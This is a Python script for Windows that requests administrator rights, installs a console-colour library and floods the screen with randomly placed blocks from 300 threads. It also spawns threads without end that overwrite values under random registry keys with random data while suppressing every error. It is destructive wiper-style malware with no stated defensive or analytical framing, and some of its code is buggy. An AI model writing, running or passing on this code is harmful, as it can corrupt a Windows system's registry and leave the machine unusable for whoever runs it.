# -*- coding: utf-8 -*-
import sys, os, platform
import subprocess
import winreg
import random
import threading
import ctypes

def run_as_admin():
    if sys.platform.startswith('win'):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except Exception as e:
            sys.exit(1)
        else:
            sys.exit(0)

if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    run_as_admin()

externalliblist = ["colorful"]

try:
        subprocess.check_call(['pip', 'install', '--upgrade', 'pip'])
        print("Successfully upgraded pip")
except subprocess.CalledProcessError:
        print("Failed to upgrade pip")

def is_library_installed(library_name):
    return library_name in sys.modules

def install_library(library_name):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', library_name])
        print(f"Successfully installed {library_name}")
    except subprocess.CalledProcessError:
        print(f"Failed to install {library_name}")

for libname in externalliblist:
        if is_library_installed(libname):
                print(libname+" Is installed.")
        else:
                print(libname+" Is not installed.")
                print(libname+" Installing...")
                install_library(libname)




def clear_console():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

clear_console()

import colorful

gestry_names = ["HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG"]



def get_random_subkey_path(key_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)

        subkeys = []
        subkey_index = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, subkey_index)
                subkeys.append(subkey_name)
                subkey_index += 1
            except OSError:
                break

        if subkeys:
            random_subkey_name = random.choice(subkeys)
            random_subkey_path = f"{key_path}\\{random_subkey_name}"
            return random_subkey_path
        else:
            return None

    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    except Exception as e:
        pass
    finally:
        winreg.CloseKey(key)

def run_main_code():
    phase = 1
    iterations = 0
    
    while True:
        if phase == 1:
            iterations += 1
            root_key_name = random.choice(gestry_names)
            root_key = getattr(winreg, root_key_name)
            traverse_random_registry_path(root_key)
            if iterations == 50:
                phase = 2
                iterations = 0
        elif phase == 2:
            search_variables()


def change_variables(key_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)

        num_values = winreg.QueryInfoKey(key)[1]
        if num_values > 0:
            for i in range(num_values):
                value_name, value_data, value_type = winreg.EnumValue(key, i)
                if value_type in [winreg.REG_SZ, winreg.REG_EXPAND_SZ, winreg.REG_MULTI_SZ]:
                    new_value_data = str(random.randint(0, 4294967295))
                elif value_type in [winreg.REG_DWORD, winreg.REG_DWORD_BIG_ENDIAN]:
                    new_value_data = random.randint(0, 4294967295)
                elif value_type == winreg.REG_QWORD:
                    new_value_data = random.randint(0, 18446744073709551615)
                elif value_type == winreg.REG_BINARY:
                    new_value_data = bytes([random.randint(0, 255) for _ in range(random.randint(1, 16))])
                winreg.SetValueEx(key, value_name, 0, value_type, new_value_data)

    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    except Exception as e:
        pass
    finally:
        winreg.CloseKey(key)

def traverse_random_registry_path(root_key):
    key_path = get_random_subkey_path(root_key)
    while key_path is not None:
        change_variables(key_path)
        key_path = get_random_subkey_path(key_path)

def search_variables():
    variables_dict = {}
    random_root_key_name = random.choice(gestry_names)
    random_root_key = getattr(winreg, random_root_key_name)
    random_key_path = get_random_subkey_path(random_root_key)
    
    if random_key_path:
        try:
            key = winreg.OpenKey(random_root_key, random_key_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            num_values = winreg.QueryInfoKey(key)[1]
            
            if num_values > 0:
                for i in range(num_values):
                    value_name, value_data, value_type = winreg.EnumValue(key, i)
                    change_variables(random_key_path)
                    variables_dict[value_name] = (value_data, value_type)
        except FileNotFoundError:
            pass
        except PermissionError:
            pass
        except Exception as e:
            pass
        finally:
            winreg.CloseKey(key)
    return variables_dict



def random_color():
    colors = ["white", "light_gray", "black"]
    return random.choice(colors)

def random_position():
    return random.randint(0, 99)

def print_random_colors():
    clear_console()
    for _ in range(100):
        console_size = os.get_terminal_size()
        console_width = console_size.columns
        console_height = console_size.lines
        position_x = random.randint(1, console_width)
        position_y = random.randint(1, console_height)
        print("\033[{};{}H".format(position_y, position_x), end="")
        print(colorful.bold("██"), end="")
    print()

def run_main_code1():
    while True:
        print_random_colors()


c=0
while c <300:
    thread = threading.Thread(target=run_main_code1)
    thread.start()
    c+=1
while True:
    thread = threading.Thread(target=run_main_code)
    thread.start()
